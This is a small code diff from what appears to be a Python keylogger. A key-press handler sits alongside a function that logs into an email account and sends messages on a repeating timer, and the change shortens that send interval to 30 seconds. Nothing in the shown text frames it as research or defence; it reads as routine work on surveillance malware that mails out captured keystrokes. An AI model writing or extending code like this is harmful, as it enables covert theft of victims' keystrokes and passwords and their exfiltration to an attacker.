@@ -27,7 +27,7 @@ def send_email():
         server.login(email, app_key)
         server.send_message(msg)
 
-    Timer(20, send_email).start()  # Send email every 5 minutes
+    Timer(30, send_email).start()  # Send email every 30 seconds
 
 def on_press(key):
     try:
